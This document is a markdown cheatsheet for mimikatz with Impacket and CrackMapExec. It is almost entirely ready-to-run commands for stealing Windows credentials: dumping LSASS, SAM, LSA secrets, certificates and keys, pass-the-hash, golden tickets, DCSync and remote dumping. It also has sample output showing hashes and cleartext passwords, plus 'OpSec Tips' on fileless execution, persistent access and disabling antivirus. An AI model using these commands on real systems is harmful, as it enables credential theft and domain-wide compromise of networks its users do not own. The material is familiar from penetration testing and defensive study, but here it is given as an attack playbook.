# mimikatz Cheatsheet

## Quick Reference

### Enable Debug Privilege

```powershell
mimikatz # privilege::debug
```

### Extract Logon Passwords

```powershell
mimikatz # sekurlsa::logonpasswords
```

### Extract Kerberos Tickets

```powershell
mimikatz # sekurlsa::tickets /export
```

### Pass-the-Hash

```powershell
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd.exe
```

### Golden Ticket

```powershell
# Create golden ticket
mimikatz # kerberos::golden /admin:administrator /domain:CORP /sid:S-1-5-21-... /krbtgt:cc36cf7a8514893efccd332446158b1a /ticket:golden.kirbi

# Use golden ticket
mimikatz # kerberos::ptt golden.kirbi
```

### Dump SAM Database

```powershell
mimikatz # lsadump::sam
```

### Dump LSA Secrets

```powershell
mimikatz # lsadump::secrets
```

### Dump Cached Credentials

```powershell
mimikatz # lsadump::cache
```

### Export Certificates

```powershell
mimikatz # crypto::certificates /export
```

### Export Private Keys

```powershell
mimikatz # crypto::keys /export
```

### Token Manipulation

```powershell
# Elevate to SYSTEM
mimikatz # token::elevate

# Revert to original token
mimikatz # token::revert
```

### DCSync Attack

```powershell
# Extract KRBTGT hash
mimikatz # lsadump::dcsync /user:domain\krbtgt /domain:lab.local

# Extract administrator hash
mimikatz # lsadump::dcsync /user:domain\administrator /domain:lab.local
```

### Complete Credential Dump

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::tickets /export
mimikatz # lsadump::sam
mimikatz # lsadump::secrets
mimikatz # lsadump::cache
mimikatz # crypto::certificates /export
mimikatz # crypto::keys /export
```

### Remote Credential Dumping (Linux)

```bash
# Using Impacket
secretsdump.py administrator:password123@192.168.1.100
secretsdump.py -hashes aad3b435b51404eeaad3b435b51404ee:cc36cf7a8514893efccd332446158b1a administrator@192.168.1.100

# Using CrackMapExec
crackmapexec smb 192.168.1.100 -u administrator -p password123 --sam
crackmapexec smb 192.168.1.100 -u administrator -p password123 --lsa
crackmapexec smb dc01.corp.local -u administrator -p password123 --ntds
```

## Modules

| Module | Description |
|--------|-------------|
| `sekurlsa` | Extract credentials from LSASS memory |
| `kerberos` | Kerberos ticket operations |
| `lsadump` | LSA secrets and SAM database |
| `crypto` | Certificate and key operations |
| `vault` | Windows Vault credentials |
| `token` | Token manipulation |
| `dpapi` | Data Protection API operations |
| `privilege` | Privilege management |

## Common Workflows

### Local Credential Dump

```powershell
# 1. Enable debug privilege
mimikatz # privilege::debug

# 2. Extract logon passwords
mimikatz # sekurlsa::logonpasswords

# 3. Extract Kerberos tickets
mimikatz # sekurlsa::tickets /export

# 4. Dump SAM
mimikatz # lsadump::sam

# 5. Dump LSA secrets
mimikatz # lsadump::secrets

# 6. Dump cached credentials
mimikatz # lsadump::cache
```

### Remote Credential Dump (Linux)

```bash
# 1. Dump SAM hashes
secretsdump.py administrator:password123@192.168.1.100

# 2. Dump LSA secrets
secretsdump.py -just-lsa CORP/administrator:password123@192.168.1.100

# 3. DCSync
secretsdump.py -just-dc-ntlm CORP/administrator:password123@dc01.corp.local
```

### Pass-the-Hash Attack

```powershell
# 1. Extract NTLM hash
mimikatz # sekurlsa::logonpasswords

# 2. Use hash for pass-the-hash
mimikatz # sekurlsa::pth /user:administrator /domain:CORP /ntlm:cc36cf7a8514893efccd332446158b1a /run:cmd.exe

# 3. Access network resources
C:\> net use \\192.168.1.100\share
```

### Golden Ticket Attack

```powershell
# 1. Extract KRBTGT hash
mimikatz # lsadump::dcsync /user:domain\krbtgt /domain:lab.local

# 2. Create golden ticket
mimikatz # kerberos::golden /admin:administrator /domain:lab.local /sid:S-1-5-21-... /krbtgt:cc36cf7a8514893efccd332446158b1a /ticket:golden.kirbi

# 3. Use golden ticket
mimikatz # kerberos::ptt golden.kirbi

# 4. Access domain resources
C:\> net use \\dc01.lab.local\share
```

## Output Formats

### Logon Passwords Output

```
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : John
Domain            : WORKGROUP
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : John
         * Domain   : WORKGROUP
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : John
         * Domain   : WORKGROUP
         * Password : Password123
```

### SAM Dump Output

```
SAM
--
RID  : 000001f4 (500)
User : Administrator
LM   : d0e9aee149655a6075e4540af1f22d3b
NTLM : cc36cf7a8514893efccd332446158b1a
```

## Troubleshooting

### Common Errors

**"Privilege not enabled"**:
```powershell
mimikatz # privilege::debug
```

**"LSASS protection enabled"**:
```powershell
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

**"No credentials found"**:
```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

**"Access denied"**:
```powershell
# Run as administrator
# Disable antivirus temporarily
# Use Impacket or CrackMapExec
```

## OpSec Tips

1. **Run as administrator**: Always enable debug privilege first
2. **Use fileless techniques**: Run mimikatz from memory
3. **Remote dumping**: Use Impacket/CrackMapExec for remote attacks
4. **Golden tickets**: Create for persistent access
5. **DCSync**: Extract KRBTGT hash for domain compromise

## Resources

- **GitHub**: https://github.com/gentilkiwi/mimikatz
- **Blog**: https://blog.gentilkiwi.com/mimikatz
- **Wiki**: https://github.com/gentilkiwi/mimikatz/wiki
